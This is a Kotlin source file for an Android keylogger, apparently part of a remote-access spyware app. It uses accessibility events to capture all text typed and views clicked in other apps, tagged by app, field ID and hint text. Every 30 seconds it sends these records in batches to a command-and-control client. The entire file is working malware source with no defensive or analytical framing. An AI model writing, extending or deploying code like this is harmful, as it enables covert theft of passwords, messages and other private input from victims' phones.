package com.xrc.app.surveillance

import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.xrc.app.XRCApp
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedQueue

/**
 * Accessibility-based keylogger that captures all text input
 * tagged by application and timestamp.
 */
object Keylogger {

    const val TAG = "Keylogger"
    private val logQueue = ConcurrentLinkedQueue<KeyLogEntry>()
    private var isRunning = false
    private const val MAX_QUEUE_SIZE = 500
    private const val FLUSH_INTERVAL_MS = 30000L // Flush to C2 every 30 seconds

    data class KeyLogEntry(
        val packageName: String,
        val text: String,
        val viewId: String,
        val className: String,
        val hintText: String,
        val timestamp: Long = System.currentTimeMillis()
    ) {
        fun toJson(): JSONObject = JSONObject().apply {
            put("package", packageName)
            put("text", if (text.length > 200) text.take(200) else text)
            put("view_id", viewId)
            put("class", className)
            put("hint", hintText)
            put("time", timestamp)
        }
    }

    fun start() {
        if (isRunning) return
        isRunning = true
        Log.i(TAG, "Keylogger started")
        startPeriodicFlush()
    }

    fun stop() {
        isRunning = false
        flushLogs()
        Log.i(TAG, "Keylogger stopped")
    }

    fun onTextChanged(event: AccessibilityEvent) {
        if (!isRunning) return
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        val source = event.source ?: return
        try {
            val entry = KeyLogEntry(
                packageName = event.packageName?.toString() ?: "unknown",
                text = text,
                viewId = source.viewIdResourceName ?: "",
                className = source.className?.toString() ?: "",
                hintText = source.hintText?.toString() ?: source.contentDescription?.toString() ?: ""
            )
            logQueue.offer(entry)

            // Auto-flush if queue is full
            if (logQueue.size >= MAX_QUEUE_SIZE) {
                flushLogs()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture text: ${e.message}")
        } finally {
            source.recycle()
        }
    }

    fun onViewClicked(event: AccessibilityEvent) {
        if (!isRunning) return
        val source = event.source ?: return
        try {
            val text = source.text?.toString() ?: source.contentDescription?.toString() ?: return
            val entry = KeyLogEntry(
                packageName = event.packageName?.toString() ?: "unknown",
                text = "[CLICK] $text",
                viewId = source.viewIdResourceName ?: "",
                className = source.className?.toString() ?: "",
                hintText = ""
            )
            logQueue.offer(entry)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture click: ${e.message}")
        } finally {
            source.recycle()
        }
    }

    fun getRecentLogs(): String {
        val entries = JSONArray()
        val iterator = logQueue.iterator()
        var count = 0
        while (iterator.hasNext() && count < 100) {
            entries.put(iterator.next().toJson())
            count++
        }
        return JSONObject().apply {
            put("type", "keylogs")
            put("count", entries.length())
            put("entries", entries)
        }.toString()
    }

    private fun flushLogs() {
        if (logQueue.isEmpty()) return
        val batch = JSONArray()
        var entry = logQueue.poll()
        while (entry != null && batch.length() < 50) {
            batch.put(entry.toJson())
            entry = logQueue.poll()
        }
        if (batch.length() > 0) {
            val payload = JSONObject().apply {
                put("type", "keylogs_batch")
                put("count", batch.length())
                put("entries", batch)
            }
            XRCApp.instance.c2Client.send(payload.toString())
        }
    }

    private fun startPeriodicFlush() {
        kotlinx.coroutines.GlobalScope.launch {
            while (isRunning) {
                kotlinx.coroutines.delay(FLUSH_INTERVAL_MS)
                flushLogs()
            }
        }
    }
}
